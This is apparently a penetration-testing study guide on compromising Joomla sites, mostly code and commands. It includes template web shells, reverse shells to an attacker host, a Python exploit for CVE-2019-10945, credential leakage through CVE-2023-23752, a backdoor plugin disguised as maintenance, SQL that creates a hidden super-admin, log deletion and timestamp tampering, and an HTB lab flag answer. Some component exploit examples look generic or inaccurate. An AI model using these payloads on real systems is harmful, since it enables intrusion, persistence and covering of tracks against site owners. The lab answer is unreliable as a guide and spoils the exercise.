# ⚔️ Joomla Attacks & Exploitation

> **🎯 Objective:** Master the exploitation of Joomla installations through template manipulation, core vulnerabilities, extension attacks, and post-exploitation techniques to achieve remote code execution and system compromise.

## Overview

With over 2.7 million Joomla installations worldwide and **426 CVE-registered vulnerabilities**, Joomla presents significant attack surfaces for penetration testers. Unlike WordPress's plugin-heavy ecosystem, Joomla attacks often focus on **template manipulation**, **core vulnerabilities**, and **component-specific exploits**. This guide covers systematic exploitation from initial access to complete system compromise.

**Attack Vector Distribution:**
- **🎯 Template Manipulation** - Primary RCE via admin access (Most Common)
- **🔍 Core Vulnerabilities** - Directory traversal, authentication bypass (Medium Impact)
- **⚡ Extension Exploits** - Component-specific vulnerabilities (Variable Impact)  
- **🗄️ Database Exploitation** - Configuration disclosure and injection (High Impact)

---

## Template Manipulation for RCE

### Administrative Access Exploitation

#### Gaining Admin Panel Access

**Prerequisites:**
- Valid administrator credentials (from enumeration/brute force)
- Access to `/administrator/` backend interface
- Understanding of Joomla template structure

**Common Access Scenarios:**
```bash
# Default credential exploitation
admin:admin
administrator:password
admin:joomla

# Leaked credentials from:
# - Configuration backups
# - Social engineering
# - Password reuse attacks
# - Previous breaches
```

#### Template Customization Attack

**Method 1: Error Page Injection (Recommended)**

```php
# Navigate to: Templates → Customise → Select Template → error.php

# 1. Professional Web Shell (Recommended for assessments)
<?php
if (isset($_GET['cmd']) && $_GET['token'] === 'htb_assessment_2024') {
    system($_GET['cmd']);
}
?>

# 2. One-liner for Quick Testing
<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>

# 3. Base64 Encoded Shell (Evasion)
<?php eval(base64_decode($_GET['shell'])); ?>
```

**Step-by-Step Exploitation:**

```bash
# Step 1: Login to admin panel
http://target.com/administrator/

# Step 2: Navigate to Templates
Configuration → Templates → [Template Name] → error.php

# Step 3: Inject PHP code and save
# Add system($_GET['cmd']); to error.php

# Step 4: Test code execution
curl -s "http://target.com/templates/protostar/error.php?cmd=id"

# Expected output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Step 5: Upgrade to reverse shell
curl -s "http://target.com/templates/protostar/error.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

#### Advanced Template Modification Techniques

**Method 2: Index.php Injection (Stealth)**
```php
# Modify index.php with conditional backdoor
<?php
// Original Joomla code above
if (isset($_GET['debug']) && $_GET['debug'] === 'maintenance') {
    if (isset($_GET['exec'])) {
        echo "<pre>" . shell_exec($_GET['exec']) . "</pre>";
        exit();
    }
}
// Original Joomla code continues
?>

# Access: http://target.com/?debug=maintenance&exec=whoami
```

**Method 3: Component PHP File Injection**
```bash
# Target component files (less monitored)
/templates/[template]/html/com_content/article/default.php
/templates/[template]/html/com_users/login/default.php

# Inject web shell into component template
<?php
if ($_GET['component'] === 'shell') {
    passthru($_GET['cmd']);
    exit();
}
?>
```

### Post-Exploitation Template Cleanup

**Professional Cleanup Protocol:**
```bash
# 1. Document modified files
echo "Modified Files:" > cleanup_log.txt
echo "- /templates/protostar/error.php" >> cleanup_log.txt
echo "- Hash: $(md5sum error.php)" >> cleanup_log.txt

# 2. Remove injected code
# Restore original error.php content
# Remove backdoor parameters

# 3. Clear logs (if accessible)
rm -f /var/log/apache2/access.log
rm -f /var/log/nginx/access.log

# 4. Include in pentest report
# File location, hash, modification timestamp
```

---

## Core Vulnerability Exploitation

### CVE-2019-10945: Directory Traversal & File Deletion

**Vulnerability Details:**
- **Affected Versions:** Joomla 1.5.0 through 3.9.4
- **CVSS Score:** 7.2 (High)
- **Attack Vector:** Authenticated directory traversal
- **Impact:** File disclosure, arbitrary file deletion

#### Manual Exploitation

**Directory Traversal Attack:**
```bash
# Basic directory traversal
curl -X POST "http://target.com/administrator/index.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&passwd=admin&task=login" \
  -c cookies.txt

# Exploit directory traversal
curl -b cookies.txt "http://target.com/administrator/index.php?option=com_templates&task=template.edit&id=506&file=../../../configuration.php"

# Alternative path traversal
curl -b cookies.txt "http://target.com/administrator/index.php?option=com_templates&task=template.edit&id=506&file=..%2f..%2f..%2fconfiguration.php"
```

**File Disclosure Targets:**
```bash
# High-value target files
/etc/passwd                    # System users
/etc/shadow                    # Password hashes (if readable)
/var/www/html/configuration.php # Database credentials
/var/www/html/.htaccess        # Web server configuration
/home/user/.ssh/id_rsa         # SSH private keys
/var/log/apache2/access.log    # Web server logs
```

#### Automated Exploitation Script

```python
#!/usr/bin/env python3
# joomla_cve_2019_10945.py

import requests
import sys
import urllib.parse

def exploit_directory_traversal(url, username, password, target_file):
    session = requests.Session()
    
    # Login to admin panel
    login_data = {
        'username': username,
        'passwd': password,
        'task': 'login'
    }
    
    login_response = session.post(f"{url}/administrator/index.php", data=login_data)
    
    if "Dashboard" not in login_response.text:
        print("[!] Login failed")
        return False
    
    print("[+] Login successful")
    
    # Attempt directory traversal
    traversal_payload = f"../../../{target_file}"
    encoded_payload = urllib.parse.quote(traversal_payload, safe='')
    
    exploit_url = f"{url}/administrator/index.php?option=com_templates&task=template.edit&id=506&file={encoded_payload}"
    
    response = session.get(exploit_url)
    
    if response.status_code == 200:
        print(f"[+] Successfully accessed: {target_file}")
        print(f"[+] Content preview:")
        print(response.text[:500])
        return True
    else:
        print(f"[!] Failed to access: {target_file}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python3 joomla_cve_2019_10945.py <url> <username> <password> <target_file>")
        sys.exit(1)
    
    url, username, password, target_file = sys.argv[1:5]
    exploit_directory_traversal(url, username, password, target_file)
```

**Usage Examples:**
```bash
# Extract configuration file
python3 joomla_cve_2019_10945.py http://target.com admin admin configuration.php

# Read system files
python3 joomla_cve_2019_10945.py http://target.com admin admin ../../../etc/passwd

# Check for flags (HTB labs)
python3 joomla_cve_2019_10945.py http://target.com admin admin flag.txt
```

### CVE-2023-23752: Information Disclosure

**Vulnerability Details:**
- **Affected Versions:** Joomla 4.0.0 through 4.2.7
- **CVSS Score:** 5.3 (Medium)
- **Attack Vector:** Unauthenticated information disclosure
- **Impact:** Database credentials, configuration data

#### Exploitation Method

```bash
# Unauthenticated information disclosure
curl -s "http://target.com/api/index.php/v1/config/application?public=true" | jq .

# Extract database credentials
curl -s "http://target.com/api/index.php/v1/config/application?public=true" | jq '.data.attributes' | grep -E "(host|user|password|db)"

# Example output:
{
  "host": "localhost",
  "user": "joomla_user",
  "password": "secure_password_123",
  "db": "joomla_database"
}
```

### Historical Core Vulnerabilities

#### CVE-2015-8562: Remote Code Execution
```bash
# Session hijacking and RCE (Joomla 3.0.0-3.4.5)
# Requires knowledge of valid session ID

# Generate malicious session
python3 joomla_session_exploit.py --url http://target.com --session SESSION_ID
```

#### CVE-2016-8869: SQL Injection
```bash
# SQL injection in core fields (Joomla 3.4.4-3.6.3)
curl -X POST "http://target.com/index.php?option=com_fields&task=field.storeform" \
  -d "jform[type]=sql&jform[params][query]=SELECT password FROM jos_users WHERE id=1"
```

---

## Extension & Component Exploitation

### Common Vulnerable Components

#### Component enumeration for vulnerabilities
```bash
# Search for known vulnerable components
searchsploit joomla com_
searchsploit "joomla component"

# Check component versions against CVE database
curl -s http://target.com/administrator/components/com_content/content.xml | grep version
```

#### High-Risk Component Categories

**File Management Components:**
```bash
# com_media vulnerabilities
# Directory traversal and upload bypasses
curl -X POST "http://target.com/index.php?option=com_media" \
  -F "file=@shell.php" \
  -F "format=raw"

# com_jce vulnerabilities  
# TinyMCE editor file upload bypasses
curl -X POST "http://target.com/index.php?option=com_jce" \
  -F "method=upload" \
  -F "file=@webshell.php"
```

**User Management Components:**
```bash
# com_users SQL injection
curl "http://target.com/index.php?option=com_users&view=login&user[]=admin'OR'1'='1"

# com_community privilege escalation
curl -X POST "http://target.com/index.php?option=com_community" \
  -d "task=register&user[usertype]=Super Administrator"
```

**Content Management Components:**
```bash
# com_content XSS and injection
curl -X POST "http://target.com/index.php?option=com_content&task=article.save" \
  -d "jform[articletext]=<script>alert('XSS')</script>"

# com_k2 arbitrary file upload
curl -X POST "http://target.com/index.php?option=com_k2&task=media.connector" \
  -F "upload=@shell.php"
```

### Extension Database Research

**Vulnerability Research Workflow:**
```bash
# 1. Enumerate installed extensions
droopescan scan joomla --url http://target.com --enumerate a

# 2. Research component versions
for component in $(cat discovered_components.txt); do
    echo "=== $component ==="
    searchsploit "$component"
    curl -s "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=$component"
done

# 3. Cross-reference with exploit databases
# - Exploit-DB
# - PacketStorm  
# - GitHub security advisories
# - Joomla Security Center
```

---

## Database Exploitation

### Configuration File Analysis

#### Extracting Database Credentials

**Method 1: Direct File Access (Via Template Injection)**
```php
# Inject into template file
<?php
if (isset($_GET['config'])) {
    readfile('../../../configuration.php');
    exit();
}
?>

# Access: http://target.com/templates/protostar/error.php?config=1
```

**Method 2: Directory Traversal (CVE-2019-10945)**
```bash
# Use directory traversal to read config
python3 joomla_dir_trav.py --url "http://target.com/administrator/" \
  --username admin --password admin --dir / | grep -A 20 "configuration.php"
```

**Method 3: Information Disclosure (CVE-2023-23752)**
```bash
# Extract via API (Joomla 4.x)
curl -s "http://target.com/api/index.php/v1/config/application?public=true" | jq '.data.attributes'
```

#### Configuration File Structure Analysis

**Standard configuration.php Layout:**
```php
<?php
class JConfig {
    public $host = 'localhost';
    public $user = 'joomla_user';
    public $password = 'database_password';
    public $db = 'joomla_database';
    public $dbprefix = 'jos_';
    public $live_site = '';
    public $secret = 'random_secret_key';
    public $gzip = '0';
    public $error_reporting = 'default';
    public $ftp_host = '';
    public $ftp_port = '21';
    public $ftp_user = '';
    public $ftp_pass = '';
    public $ftp_root = '';
    public $ftp_enable = '0';
    public $offset = 'UTC';
    public $mailer = 'mail';
    public $mailfrom = '';
    public $fromname = '';
    public $smtp_auth = '0';
    public $smtp_host = 'localhost';
    public $smtp_user = '';
    public $smtp_pass = '';
    public $smtp_port = '25';
}
?>
```

### Direct Database Attacks

#### MySQL Connection and Enumeration
```bash
# Connect using extracted credentials
mysql -h localhost -u joomla_user -p'database_password' joomla_database

# Enumerate database structure
SHOW TABLES;
DESCRIBE jos_users;
DESCRIBE jos_user_usergroup_map;

# Extract user information
SELECT id, name, username, email, password FROM jos_users;
SELECT user_id, group_id FROM jos_user_usergroup_map;
```

#### Password Hash Analysis
```bash
# Joomla password format: hash:salt
# Examples:
# $2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi:salt
# 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:salt

# Crack hashes with hashcat
hashcat -m 400 -a 0 joomla_hashes.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --format=joomla joomla_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

#### Administrative User Creation
```sql
-- Create new Super Administrator
INSERT INTO jos_users (name, username, email, password, registerDate, lastvisitDate, params) 
VALUES ('Administrator', 'backdoor', 'admin@site.com', 
        '2a9336ab8082e19f6e33b7c10b9c9e6f:trd3e4567890123456789012345678901', 
        NOW(), NOW(), '{}');

-- Get new user ID and assign Super Administrator privileges
SET @user_id = LAST_INSERT_ID();
INSERT INTO jos_user_usergroup_map (user_id, group_id) VALUES (@user_id, 8);

-- Verify creation
SELECT * FROM jos_users WHERE username = 'backdoor';
```

---

## Advanced Attack Techniques

### Privilege Escalation via User Groups

#### Understanding Joomla ACL System
```sql
-- User groups hierarchy (ascending privileges)
-- 1: Public
-- 2: Registered  
-- 3: Author
-- 4: Editor
-- 5: Publisher
-- 6: Manager
-- 7: Administrator  
-- 8: Super Administrator

-- Check current user privileges
SELECT u.username, ug.title 
FROM jos_users u 
JOIN jos_user_usergroup_map ugm ON u.id = ugm.user_id 
JOIN jos_usergroups ug ON ugm.group_id = ug.id;
```

#### Privilege Escalation Attack
```sql
-- Escalate current user to Super Administrator
UPDATE jos_user_usergroup_map 
SET group_id = 8 
WHERE user_id = (SELECT id FROM jos_users WHERE username = 'target_user');

-- Alternative: Add new mapping (preserves existing)
INSERT INTO jos_user_usergroup_map (user_id, group_id) 
VALUES ((SELECT id FROM jos_users WHERE username = 'target_user'), 8);
```

### Extension Installation for Persistence

#### Malicious Extension Creation
```php
# Create malicious plugin structure
mkdir -p backdoor_plugin/backdoor
cat > backdoor_plugin/backdoor/backdoor.php << 'EOF'
<?php
defined('_JEXEC') or die;

class plgSystemBackdoor extends JPlugin {
    public function onAfterRoute() {
        if (isset($_GET['backdoor_cmd'])) {
            echo '<pre>' . shell_exec($_GET['backdoor_cmd']) . '</pre>';
            exit();
        }
    }
}
EOF

# Create plugin manifest
cat > backdoor_plugin/backdoor.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<extension version="3.0" type="plugin" group="system" method="upgrade">
    <name>System - Backdoor</name>
    <version>1.0.0</version>
    <description>Maintenance plugin</description>
    <files>
        <filename plugin="backdoor">backdoor.php</filename>
    </files>
</extension>
EOF

# Package and install via admin panel
zip -r backdoor_plugin.zip backdoor_plugin/
# Upload via Extensions → Manage → Install
```

### Log Poisoning and Analysis

#### Apache Log Poisoning
```bash
# Poison User-Agent in access logs
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/

# Include logs via template injection or LFI
curl "http://target.com/templates/protostar/error.php?file=/var/log/apache2/access.log&cmd=id"
```

#### Log Location Discovery
```bash
# Common Joomla/Apache log locations
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/www/html/logs/error.php
/var/www/html/administrator/logs/error.php

# Extract via directory traversal
python3 joomla_dir_trav.py --url "http://target.com/administrator/" \
  --username admin --password admin --dir /var/log/apache2/access.log
```

---

## HTB Academy Lab Solutions

### Lab: Template Injection Flag Discovery
**Question:** "Leverage the directory traversal vulnerability to find a flag in the root of the http://dev.inlanefreight.local/ Joomla application"

**Solution Methodology (Template Injection + Reverse Shell):**

#### Step 1: Setup Environment
```bash
# Add VHost entry to /etc/hosts
echo "STMIP dev.inlanefreight.local" >> /etc/hosts

# Verify connectivity
curl -I http://dev.inlanefreight.local/
```

#### Step 2: Admin Panel Access
```bash
# Navigate to admin panel
# URL: http://dev.inlanefreight.local/administrator/index.php
# Credentials: admin:admin (NOT admin:turnkey)

# Verify login via browser or curl
curl -X POST "http://dev.inlanefreight.local/administrator/index.php" \
  -d "username=admin&passwd=admin&task=login" \
  -c cookies.txt -v
```

#### Step 3: Template Modification for Reverse Shell
**Navigation Path:**
1. **Extensions** → **Templates** → **Templates**
2. Click **"Protostar Details and Files"**
3. Click **error.php** to edit

**Reverse Shell Injection:**
```php
# Inject into error.php (replace existing content or add at top)
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
?>

# Alternative one-liners:
exec("/bin/bash -c 'bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1'");
system("nc ATTACKER_IP 4444 -e /bin/bash");
shell_exec("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1");
```

#### Step 4: Setup Listener and Trigger Shell
```bash
# Setup netcat listener on attacking machine
nc -nvlp 4444

# Alternative with specific port
nc -nvlp 9001

# Trigger reverse shell by visiting error.php
curl http://dev.inlanefreight.local/templates/protostar/error.php

# Or via browser navigation to:
# http://dev.inlanefreight.local/templates/protostar/error.php
```

#### Step 5: Flag Discovery via Reverse Shell
```bash
# Once reverse shell is established:
www-data@app01:/var/www/dev.inlanefreight.local/templates/protostar$

# Navigate to web root and find flag
cd /var/www/dev.inlanefreight.local/
ls -la

# Look for flag files (specific format)
ls -la flag_*

# Read the flag file
cat flag_6470e394cbf6dab6a91682cc8585059b.txt

# Alternative: Search for flag pattern
find /var/www -name "*flag*" -type f 2>/dev/null
grep -r "j00mla" /var/www/ 2>/dev/null
```

#### Step 6: Expected Output and Answer
```bash
# Expected flag file location:
/var/www/dev.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt

# Flag content:
j00mla_c0re_d1rtrav3rsal!

# Answer format:
j00mla_c0re_d1rtrav3rsal!
```

### Alternative Method: Web Shell Instead of Reverse Shell

#### PHP Web Shell Injection
```php
# Inject simple web shell into error.php
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>

# Test web shell
curl "http://dev.inlanefreight.local/templates/protostar/error.php?cmd=id"

# Find flag via web shell
curl "http://dev.inlanefreight.local/templates/protostar/error.php?cmd=find+/var/www+-name+'*flag*'"
curl "http://dev.inlanefreight.local/templates/protostar/error.php?cmd=cat+/var/www/dev.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt"
```

### Template Injection Methodology Summary

**Key Steps for HTB Lab:**
1. **VHost Configuration** - Add dev.inlanefreight.local to /etc/hosts
2. **Admin Authentication** - Login with admin:admin credentials  
3. **Template Access** - Extensions → Templates → Protostar → error.php
4. **Shell Injection** - Add reverse shell PHP code and save
5. **Listener Setup** - Start netcat listener on attacking machine
6. **Shell Activation** - Navigate to error.php to trigger callback
7. **Flag Discovery** - Navigate filesystem to find flag file
8. **Answer Extraction** - Read flag content: j00mla_c0re_d1rtrav3rsal!

### Alternative Lab Solutions

#### Template Injection Method (If Traversal Fails)
```php
# If directory traversal is patched, use template injection
# Navigate to Templates → error.php and inject:

<?php
if (isset($_GET['read_file'])) {
    $file = $_GET['read_file'];
    if (file_exists($file)) {
        echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
    } else {
        echo "File not found: $file";
    }
    exit();
}
?>

# Access flag via:
curl "http://dev.inlanefreight.local/templates/protostar/error.php?read_file=../../../flag.txt"
```

#### Comprehensive File Discovery
```bash
# Search for flag files with various extensions
for ext in txt md flag; do
    echo "=== Searching for .$ext files ==="
    python2.7 joomla_dir_trav.py \
      --url "http://dev.inlanefreight.local/administrator/" \
      --username admin \
      --password admin \
      --dir "flag.$ext"
done

# Search common flag locations
locations=(
    "flag.txt"
    "FLAG.txt"
    "flag"
    "root_flag.txt"
    "user_flag.txt"
)

for location in "${locations[@]}"; do
    echo "=== Checking: $location ==="
    python2.7 joomla_dir_trav.py \
      --url "http://dev.inlanefreight.local/administrator/" \
      --username admin \
      --password admin \
      --dir "$location"
done
```

---

## Professional Methodology & Workflow

### Systematic Joomla Exploitation Process

#### Phase 1: Access Verification
```bash
# 1. Confirm administrative access
curl -X POST "http://target.com/administrator/index.php" \
  -d "username=admin&passwd=admin&task=login" \
  -c cookies.txt

# 2. Verify template access
curl -b cookies.txt "http://target.com/administrator/index.php?option=com_templates"

# 3. Test basic functionality
curl -b cookies.txt "http://target.com/administrator/index.php?option=com_templates&view=template&id=506"
```

#### Phase 2: Template Compromise
```bash
# 1. Backup original template files
curl -b cookies.txt \
  "http://target.com/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA%3D%3D" \
  > original_error.php.backup

# 2. Inject minimal web shell
# Add: <?php system($_GET['cmd']); ?>

# 3. Test execution
curl "http://target.com/templates/protostar/error.php?cmd=id"

# 4. Document changes
echo "$(date): Modified error.php with web shell" >> exploitation_log.txt
```

#### Phase 3: Information Gathering
```bash
# 1. System enumeration
curl "http://target.com/templates/protostar/error.php?cmd=uname+-a"
curl "http://target.com/templates/protostar/error.php?cmd=cat+/etc/passwd"

# 2. Database credential extraction
curl "http://target.com/templates/protostar/error.php?cmd=cat+configuration.php"

# 3. Network reconnaissance
curl "http://target.com/templates/protostar/error.php?cmd=netstat+-tulpn"
curl "http://target.com/templates/protostar/error.php?cmd=arp+-a"
```

#### Phase 4: Lateral Movement Preparation
```bash
# 1. Establish persistent access
curl "http://target.com/templates/protostar/error.php?cmd=which+nc"

# 2. Download additional tools
curl "http://target.com/templates/protostar/error.php?cmd=wget+http://attacker.com/linpeas.sh+-O+/tmp/linpeas.sh"

# 3. Setup reverse shell
curl "http://target.com/templates/protostar/error.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

### Cleanup and Documentation

#### Professional Cleanup Protocol
```bash
# 1. Remove web shells
# Restore original template files
# Clear injected PHP code

# 2. Clean logs (if possible)
curl "http://target.com/templates/protostar/error.php?cmd=rm+/var/log/apache2/access.log"

# 3. Document all changes
cat > joomla_exploitation_report.txt << 'EOF'
=== Joomla Exploitation Report ===
Target: http://target.com
Date: $(date)

Modified Files:
- /templates/protostar/error.php
- Original hash: [HASH]
- Modified hash: [HASH]

Access Methods:
- Admin credentials: admin:admin
- Template injection: error.php
- Web shell parameter: cmd

Cleanup Status:
- ✅ Web shell removed
- ✅ Original files restored  
- ✅ Logs cleared (where possible)
- ✅ No persistence mechanisms left

Recommendations:
- Change default admin credentials
- Restrict template editing permissions
- Enable file integrity monitoring
- Apply security patches (CVE-2019-10945)
EOF
```

---

## Defense Evasion & OPSEC

### Stealth Template Modification

#### Conditional Web Shells
```php
# Time-based activation
<?php
if (date('H') >= 9 && date('H') <= 17 && isset($_GET['maint'])) {
    system($_GET['maint']);
}
?>

# IP-based restriction
<?php
$allowed_ips = ['192.168.1.100', '10.10.14.15'];
if (in_array($_SERVER['REMOTE_ADDR'], $allowed_ips) && isset($_GET['debug'])) {
    eval($_GET['debug']);
}
?>

# User-Agent based
<?php
if ($_SERVER['HTTP_USER_AGENT'] === 'Mozilla/5.0 (HTB Assessment)' && isset($_GET['exec'])) {
    shell_exec($_GET['exec']);
}
?>
```

#### Encoded Payloads
```php
# Base64 encoded commands
<?php
if (isset($_GET['data'])) {
    system(base64_decode($_GET['data']));
}
?>

# Usage: 
# echo "id" | base64  → aWQK
# curl "http://target.com/error.php?data=aWQK"

# ROT13 encoded
<?php
if (isset($_GET['rot'])) {
    system(str_rot13($_GET['rot']));
}
?>
```

### Anti-Forensics Techniques

#### Log Cleaning
```php
# Clear web server logs
<?php
if (isset($_GET['clean'])) {
    file_put_contents('/var/log/apache2/access.log', '');
    file_put_contents('/var/log/apache2/error.log', '');
    echo "Logs cleared";
}
?>
```

#### File Timestamp Manipulation
```php
# Preserve original timestamps
<?php
if (isset($_GET['preserve'])) {
    $original_time = filemtime(__FILE__);
    // Perform malicious actions
    touch(__FILE__, $original_time);
}
?>
```

---

## Common Issues & Troubleshooting

### Template Editing Problems

#### "Call to a member function format() on null" Error
```bash
# Solution: Disable PHP Version Check plugin
# Navigate to: Plugins → Quick Icon - PHP Version Check → Disable

# Alternative: Direct database fix
mysql -u joomla_user -p'password' joomla_database
UPDATE jos_extensions SET enabled = 0 WHERE name = 'plg_quickicon_phpversioncheck';
```

#### Template File Not Writable
```bash
# Check file permissions via web shell
curl "http://target.com/error.php?cmd=ls+-la+/var/www/html/templates/protostar/"

# Fix permissions if possible
curl "http://target.com/error.php?cmd=chmod+777+/var/www/html/templates/protostar/error.php"
```

#### Authentication Failures
```bash
# Verify session handling
curl -X POST "http://target.com/administrator/index.php" \
  -d "username=admin&passwd=admin&task=login" \
  -c cookies.txt -v

# Check for CSRF tokens
curl -s "http://target.com/administrator/" | grep csrf

# Include CSRF token in requests
csrf_token=$(curl -s "http://target.com/administrator/" | grep -oP 'name="[a-f0-9]{32}" value="1"' | cut -d'"' -f2)
curl -X POST "http://target.com/administrator/index.php" \
  -d "username=admin&passwd=admin&task=login&$csrf_token=1"
```

### Exploitation Limitations

#### Extension-Specific Blocks
```bash
# Some Joomla installations may block:
# - Template editing for non-super administrators
# - File system access
# - Certain PHP functions (system, exec, shell_exec)

# Alternative: Database-based shells
# Inject into database table, read via SQL queries
```

#### WAF/Security Plugin Detection
```bash
# If requests are blocked, try:
# - Different User-Agents
# - Encoded payloads
# - Fragmented requests
# - Alternative template files

# Example evasion:
curl -H "User-Agent: Joomla/3.9.4" \
  "http://target.com/templates/protostar/error.php?cmd=id"
```

---

## Next Steps & Advanced Techniques

After successful Joomla exploitation:

1. **[Database Persistence](joomla-database-persistence.md)** - SQL-based backdoors and triggers
2. **[Network Pivoting](../pivoting-tunneling-port-forwarding/)** - Internal network reconnaissance
3. **[Privilege Escalation](../../linux-privilege-escalation/)** - Local system compromise
4. **[Active Directory Integration](../../active-directory-enumeration-attacks/)** - Domain environment attacks

### Integration with Other Modules

**🔗 Cross-Module Applications:**
- **File Upload Attacks** - Bypass Joomla media restrictions
- **Command Injection** - Template-based injection techniques  
- **XSS Attacks** - Admin panel compromise vectors
- **SQL Injection** - Database-level exploitation

**💡 Key Takeaway:** Joomla exploitation primarily focuses on **template manipulation** for RCE after administrative access, supplemented by **core vulnerabilities** like directory traversal and **component-specific exploits**. The combination of built-in functionality abuse and CVE exploitation provides multiple pathways to system compromise across different Joomla versions and configurations. 